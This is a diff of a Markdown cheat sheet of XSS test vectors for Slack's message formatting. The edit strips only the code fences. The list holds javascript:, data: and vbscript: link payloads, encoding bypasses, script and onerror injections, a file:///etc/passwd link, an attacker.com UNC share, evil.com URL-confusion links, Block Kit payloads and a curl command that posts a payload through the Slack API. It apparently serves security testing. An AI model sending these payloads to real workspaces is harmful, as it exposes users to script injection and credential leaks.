@@ -5,7 +5,7 @@
 - Bold: *text*
 - Italic: _text_
 - Strike: ~text~
-- Code: `code` or ```code block```
+- Code: `code` or code block
 - Links: <URL|text>
 - User mentions: <@USER_ID>
 - Channel mentions: <#CHANNEL_ID>
@@ -17,26 +17,26 @@
 ## XSS Test Vectors
 
 ### 1. Link Injection Tests
-```
+
 <javascript:alert(1)|Click me>
 <javascript:alert`1`|test>
 <data:text/html,<script>alert(1)</script>|test>
 <data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==|test>
 <vbscript:msgbox(1)|test>
 <javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>|x>
-```
+
 
 ### 2. Protocol Handler Tests
-```
+
 <tel:1234567890|call>
 <mailto:test@test.com|email>
 <slack://channel?team=T1234&id=C1234|channel>
 <file:///etc/passwd|file>
 <\\\\attacker.com\\share|unc>
-```
+
 
 ### 3. Unicode/Encoding Bypass Tests
-```
+
 <java\x00script:alert(1)|test>
 <java\u0000script:alert(1)|test>
 <\x6aavascript:alert(1)|test>
@@ -44,73 +44,73 @@
 <javascript&#58;alert(1)|test>
 <javascript&#x3a;alert(1)|test>
 <javasc&#x72;ipt:alert(1)|test>
-```
+
 
 ### 4. URL Parsing Confusion
-```
+
 <https://slack.com@evil.com/path|link>
 <https://evil.com\@slack.com|link>
 <//evil.com|link>
 <///evil.com|link>
 <http:evil.com|link>
 <https://slack.com%2f%2e%2e%2f%2e%2e@evil.com|test>
-```
+
 
 ### 5. SVG/Image Injection (if images supported)
-```
+
 <data:image/svg+xml,<svg onload=alert(1)>|img>
 <data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+|img>
-```
+
 
 ### 6. User/Channel Mention Injection
-```
+
 <@U123|<script>alert(1)</script>>
 <#C123|<img src=x onerror=alert(1)>>
 <@U123|javascript:alert(1)>
-```
+
 
 ### 7. Emoji Name Injection
-```
+
 :+ADw-script+AD4-alert(1)+ADw-/script+AD4-:
 :<script>alert(1)</script>:
 :"><img src=x onerror=alert(1)>:
-```
+
 
 ### 8. Code Block Escape Attempts
-```
-```javascript
+
+javascript
 </script><script>alert(1)//
-```
+
 
 `</code><img src=x onerror=alert(1)>`
 
-```
+
 \`</code><script>alert(1)</script>
-```
+
 
 ### 9. Quote Block Injection
-```
+
 > <script>alert(1)</script>
 >>> <img src=x onerror=alert(1)>
-```
+
 
 ### 10. Nested/Recursive Parsing
-```
+
 *_~`<script>alert(1)</script>`~_*
 <*bold*|link>
 <_italic_|link>
 <<nested>|outer>
-```
+
 
 ### 11. Line Break/Null Byte Injection
-```
+
 <javascript:\nalert(1)|test>
 <javascript:\ralert(1)|test>
 <java\0script:alert(1)|test>
-```
+
 
 ### 12. Attachment/Block Kit Payloads (API level)
-```json
+json
 {
   "blocks": [
     {
@@ -122,7 +122,7 @@
     }
   ]
 }
-```
+
 
 ### 13. Unfurl Payloads (Open Graph Injection)
 When sharing a link, Slack unfurls it. Test with:
@@ -131,19 +131,19 @@ When sharing a link, Slack unfurls it. Test with:
 - og:image with javascript: URL
 
 ### 14. Workflow Builder Payloads
-```
+
 {{trigger.user.name}}<script>alert(1)</script>
 {{channel.name}}</p><script>alert(1)</script>
-```
+
 
 ### 15. App Home Tab/Modal Payloads
-```json
+json
 {
   "type": "modal",
   "title": {"type": "plain_text", "text": "<script>alert(1)</script>"},
   "blocks": [...]
 }
-```
+
 
 ---
 
@@ -174,7 +174,7 @@ Based on historical XSS in similar platforms:
 
 ## Tools for Testing
 
-```bash
+bash
 # Slack API message posting
 curl -X POST https://slack.com/api/chat.postMessage \
   -H "Authorization: Bearer xoxb-YOUR-TOKEN" \
@@ -182,4 +182,4 @@ curl -X POST https://slack.com/api/chat.postMessage \
   -d '{"channel":"C1234","text":"<javascript:alert(1)|test>"}'
 
 # Check response for rendered HTML
-```
+
